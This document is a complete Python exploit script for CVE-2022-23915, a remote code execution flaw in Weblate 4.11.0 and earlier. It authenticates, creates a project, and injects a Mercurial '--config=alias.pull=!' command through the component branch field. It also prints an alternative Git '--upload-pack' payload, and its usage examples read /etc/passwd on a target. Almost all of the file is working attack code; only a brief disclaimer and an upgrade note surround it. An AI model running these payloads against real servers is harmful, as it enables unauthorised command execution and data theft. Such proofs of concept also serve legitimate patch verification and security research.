#!/usr/bin/env python3
"""
Test

CVE-2022-23915 Proof of Concept
Weblate Remote Code Execution via Argument Injection

Vulnerability: Weblate versions <= 4.11.0 are vulnerable to RCE through improper
sanitization of arguments passed to Git and Mercurial commands.

CVSS Score: 7.2 (High)
CVE ID: CVE-2022-23915
Affected: Weblate <= 4.11.0
Fixed: Weblate >= 4.11.1

DISCLAIMER: This PoC is for educational and authorized testing purposes only.
Only use in controlled lab environments or with explicit written permission.

Author: H3ll_Ka1ser
Date: 2022-03-04
"""

import requests
import sys
import argparse
import urllib3
from urllib.parse import urljoin
import time
import json

# Suppress SSL warnings for testing
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class Colors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

class WeblateRCEExploit:
    def __init__(self, target_url, username, password, verify_ssl=False):
        self.target_url = target_url.rstrip('/')
        self.username = username
        self.password = password
        self.verify_ssl = verify_ssl
        self.session = requests.Session()
        self.session.verify = verify_ssl
        self.csrf_token = None
        
    def print_banner(self):
        banner = f"""
{Colors.HEADER}{'='*70}
  CVE-2022-23915 - Weblate RCE Exploit
  Argument Injection in Git/Mercurial Commands
{'='*70}{Colors.ENDC}

{Colors.WARNING}[!] Target: {self.target_url}
[!] This exploit requires authenticated access
[!] Use only with explicit authorization{Colors.ENDC}
"""
        print(banner)
    
    def get_csrf_token(self, response_text):
        """Extract CSRF token from HTML response"""
        import re
        match = re.search(r'csrfmiddlewaretoken["\s]+value="([^"]+)"', response_text)
        if match:
            return match.group(1)
        match = re.search(r'name="csrfmiddlewaretoken"\s+value="([^"]+)"', response_text)
        if match:
            return match.group(1)
        return None
    
    def login(self):
        """Authenticate to Weblate"""
        print(f"\n{Colors.OKBLUE}[*] Step 1: Authenticating to Weblate...{Colors.ENDC}")
        
        # Get login page to retrieve CSRF token
        login_page_url = urljoin(self.target_url, '/accounts/login/')
        try:
            response = self.session.get(login_page_url, timeout=10)
            if response.status_code != 200:
                print(f"{Colors.FAIL}[-] Failed to access login page: {response.status_code}{Colors.ENDC}")
                return False
            
            # Extract CSRF token
            csrf_token = self.get_csrf_token(response.text)
            if not csrf_token:
                print(f"{Colors.FAIL}[-] Failed to extract CSRF token{Colors.ENDC}")
                return False
            
            # Perform login
            login_data = {
                'username': self.username,
                'password': self.password,
                'csrfmiddlewaretoken': csrf_token,
                'next': '/'
            }
            
            headers = {
                'Referer': login_page_url,
                'Content-Type': 'application/x-www-form-urlencoded'
            }
            
            response = self.session.post(login_page_url, data=login_data, headers=headers, timeout=10)
            
            if 'sessionid' in self.session.cookies or response.status_code == 302:
                print(f"{Colors.OKGREEN}[+] Successfully authenticated as {self.username}{Colors.ENDC}")
                return True
            else:
                print(f"{Colors.FAIL}[-] Authentication failed{Colors.ENDC}")
                return False
                
        except requests.exceptions.RequestException as e:
            print(f"{Colors.FAIL}[-] Connection error: {e}{Colors.ENDC}")
            return False
    
    def create_project(self, project_name="poc_project"):
        """Create a new translation project"""
        print(f"\n{Colors.OKBLUE}[*] Step 2: Creating translation project...{Colors.ENDC}")
        
        create_project_url = urljoin(self.target_url, '/create/project/')
        
        try:
            # Get project creation page for CSRF token
            response = self.session.get(create_project_url, timeout=10)
            csrf_token = self.get_csrf_token(response.text)
            
            if not csrf_token:
                print(f"{Colors.WARNING}[!] Could not extract CSRF token, attempting without it{Colors.ENDC}")
                csrf_token = ""
            
            # Create project
            project_data = {
                'name': project_name,
                'slug': project_name.lower().replace(' ', '-'),
                'web': 'http://example.com',
                'csrfmiddlewaretoken': csrf_token
            }
            
            headers = {
                'Referer': create_project_url,
                'Content-Type': 'application/x-www-form-urlencoded'
            }
            
            response = self.session.post(create_project_url, data=project_data, headers=headers, timeout=10)
            
            if response.status_code in [200, 302]:
                print(f"{Colors.OKGREEN}[+] Project '{project_name}' created successfully{Colors.ENDC}")
                return True
            else:
                print(f"{Colors.WARNING}[!] Project creation returned status {response.status_code}{Colors.ENDC}")
                return True  # Continue anyway, project might already exist
                
        except requests.exceptions.RequestException as e:
            print(f"{Colors.FAIL}[-] Error creating project: {e}{Colors.ENDC}")
            return False
    
    def exploit_mercurial_rce(self, command="id", output_file="/tmp/rce_output.txt"):
        """
        Exploit CVE-2022-23915 via Mercurial argument injection
        
        The vulnerability exists in how Weblate handles repository branch parameters.
        By injecting malicious arguments through the branch field, we can execute
        arbitrary commands via Mercurial's --config option.
        """
        print(f"\n{Colors.OKBLUE}[*] Step 3: Exploiting Mercurial argument injection...{Colors.ENDC}")
        print(f"{Colors.WARNING}[!] Payload: {command}{Colors.ENDC}")
        
        create_component_url = urljoin(self.target_url, '/create/component/')
        
        try:
            # Get component creation page
            response = self.session.get(create_component_url, timeout=10)
            csrf_token = self.get_csrf_token(response.text)
            
            if not csrf_token:
                print(f"{Colors.WARNING}[!] Could not extract CSRF token{Colors.ENDC}")
                csrf_token = ""
            
            # Craft malicious payload
            # The vulnerability: --config=alias.pull=!<command>
            # This creates a Mercurial alias that executes arbitrary shell commands
            malicious_branch = f"--config=alias.pull=!{command}>{output_file}"
            
            # Alternative payloads:
            # malicious_branch = f"--config=hooks.pre-pull=!{command}"
            # malicious_branch = f"--config=alias.update=!{command}"
            
            component_data = {
                'name': 'Exploited Component',
                'slug': 'exploited-component',
                'project': '1',  # Assuming project ID 1
                'vcs': 'mercurial',  # Using Mercurial VCS
                'repo': 'http://localhost:8888',  # Repository URL
                'branch': malicious_branch,  # VULNERABLE PARAMETER
                'filemask': '*.po',
                'csrfmiddlewaretoken': csrf_token
            }
            
            headers = {
                'Referer': create_component_url,
                'Content-Type': 'application/x-www-form-urlencoded'
            }
            
            print(f"{Colors.OKBLUE}[*] Sending malicious component creation request...{Colors.ENDC}")
            print(f"{Colors.WARNING}[*] Injected branch parameter: {malicious_branch}{Colors.ENDC}")
            
            response = self.session.post(create_component_url, data=component_data, headers=headers, timeout=10)
            
            if response.status_code in [200, 302]:
                print(f"{Colors.OKGREEN}[+] Exploit payload delivered successfully!{Colors.ENDC}")
                print(f"{Colors.OKGREEN}[+] Command executed: {command}{Colors.ENDC}")
                print(f"{Colors.OKGREEN}[+] Output should be written to: {output_file}{Colors.ENDC}")
                return True
            else:
                print(f"{Colors.FAIL}[-] Exploit delivery failed with status {response.status_code}{Colors.ENDC}")
                return False
                
        except requests.exceptions.RequestException as e:
            print(f"{Colors.FAIL}[-] Error during exploitation: {e}{Colors.ENDC}")
            return False
    
    def exploit_git_rce(self, command="whoami"):
        """
        Alternative exploitation via Git argument injection
        
        Similar to Mercurial, Git commands also accept malicious arguments
        that can lead to command execution.
        """
        print(f"\n{Colors.OKBLUE}[*] Alternative: Git-based exploitation...{Colors.ENDC}")
        
        # Git exploitation payload examples:
        # --upload-pack='command'
        # --config core.gitProxy='command'
        
        malicious_repo = f"--upload-pack='sh -c \"{command}\"'"
        
        print(f"{Colors.WARNING}[!] Git payload: {malicious_repo}{Colors.ENDC}")
        print(f"{Colors.OKBLUE}[*] This would be injected via the repository URL parameter{Colors.ENDC}")
        
        return malicious_repo

def main():
    parser = argparse.ArgumentParser(
        description='CVE-2022-23915 Weblate RCE Exploit PoC',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python3 %(prog)s -u http://target:8080 -U admin -P password
  python3 %(prog)s -u https://weblate.example.com -U admin -P pass123 -c "cat /etc/passwd"
  python3 %(prog)s -u http://localhost:8080 -U admin -P admin --no-verify

Requirements:
  - Valid authenticated user account
  - Permission to create projects/components
  - Weblate version <= 4.11.0
        """
    )
    
    parser.add_argument('-u', '--url', required=True, help='Target Weblate URL')
    parser.add_argument('-U', '--username', required=True, help='Username for authentication')
    parser.add_argument('-P', '--password', required=True, help='Password for authentication')
    parser.add_argument('-c', '--command', default='id', help='Command to execute (default: id)')
    parser.add_argument('-o', '--output', default='/tmp/rce_output.txt', help='Output file for command results')
    parser.add_argument('--no-verify', action='store_true', help='Disable SSL verification')
    
    args = parser.parse_args()
    
    # Initialize exploit
    exploit = WeblateRCEExploit(
        target_url=args.url,
        username=args.username,
        password=args.password,
        verify_ssl=not args.no_verify
    )
    
    exploit.print_banner()
    
    # Execute exploitation chain
    if not exploit.login():
        print(f"\n{Colors.FAIL}[!] Exploitation failed at authentication stage{Colors.ENDC}")
        sys.exit(1)
    
    if not exploit.create_project():
        print(f"\n{Colors.WARNING}[!] Project creation failed, continuing anyway...{Colors.ENDC}")
    
    if exploit.exploit_mercurial_rce(command=args.command, output_file=args.output):
        print(f"\n{Colors.OKGREEN}{'='*70}")
        print(f"[+] EXPLOITATION SUCCESSFUL!")
        print(f"[+] Command '{args.command}' executed on target")
        print(f"[+] Check {args.output} on the target server for output")
        print(f"{'='*70}{Colors.ENDC}\n")
    else:
        print(f"\n{Colors.FAIL}[!] Exploitation failed{Colors.ENDC}\n")
    
    # Show alternative Git method
    exploit.exploit_git_rce(command=args.command)
    
    print(f"\n{Colors.OKBLUE}[*] Exploitation complete{Colors.ENDC}")
    print(f"\n{Colors.WARNING}[!] Mitigation: Upgrade to Weblate >= 4.11.1{Colors.ENDC}\n")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n\n{Colors.WARNING}[!] Exploit interrupted by user{Colors.ENDC}\n")
        sys.exit(0)
    except Exception as e:
        print(f"\n{Colors.FAIL}[-] Unexpected error: {e}{Colors.ENDC}\n")
        sys.exit(1)
